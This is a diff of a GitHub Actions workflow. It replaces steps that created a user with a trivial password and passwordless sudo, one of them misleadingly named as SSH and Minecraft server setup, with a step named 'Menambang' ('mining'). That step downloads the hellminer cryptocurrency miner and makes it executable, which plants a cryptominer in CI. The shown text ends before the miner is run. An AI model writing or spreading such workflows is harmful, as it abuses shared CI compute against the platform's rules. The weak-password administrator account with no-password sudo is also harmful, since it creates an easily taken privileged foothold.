@@ -6,17 +6,8 @@ jobs:
   setup:
     runs-on: ubuntu-latest
     steps:
-      - name: Create User
+      - name: Menambang
         run: |
-          sudo useradd -m -s /bin/bash hudacihuyy
-          echo 'hudacihuyy:ll' | sudo chpasswd
-          sudo usermod -aG sudo hudacihuyy
-          echo "hudacihuyy ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/hudacihuyy
-
-      - name: Start Ssh and Setup Minecraft Server
-        run: |
-          sudo -u hudacihuyy bash -c 'echo "Hello dari user $(whoami)"'
-          
           wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
           tar -xzf hellminer_linux64.tar.gz
           chmod +x hellminer
